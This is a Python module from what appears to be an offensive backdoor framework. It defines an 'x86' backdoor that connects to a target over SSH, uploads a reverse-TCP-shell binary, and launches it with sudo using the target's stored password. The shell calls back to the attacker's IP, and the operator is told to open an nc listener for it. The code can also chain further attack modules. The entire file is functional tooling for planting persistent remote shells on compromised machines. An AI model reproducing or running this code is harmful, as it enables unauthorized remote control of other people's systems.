from backdoors.backdoor import *


class x86(Backdoor):
    prompt = Fore.RED + "x86" + Fore.BLUE + ">> " + Fore.RESET

    def __init__(self, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using x86 module..."
        self.core = core
        self.options = {
            "port": Option("port", 53935, "port to connect to", True),
        }
        self.allow_modules = True
        self.modules = {}
        self.help_text = "A binary that should run on many x86 platforms allowing for a reverse tcp shell"

    def get_command(self):
        return "echo " + self.core.curtarget.pword + " | sudo -S nohup ./x86 " + self.core.localIP + " " + str(self.get_value("port"))

    def do_exploit(self, args):
        input("Run the following command: nc -vnlp %s in another shell" % str(self.get_value("port")))
        target = self.core.curtarget
        port = self.get_value("port")
        target.ssh.exec_command('rm x86')
        target.scpFiles(self, 'backdoors/shell/x86/x86', False)
        print(GOOD + "Moving the backdoor program")
        target.ssh.exec_command(self.get_command())
        print(GOOD + "Python backdoor on %s attempted." % port)

        for mod in self.modules.keys():
            print(INFO + "Attempting to execute " + mod.name + " module...")
            mod.exploit()
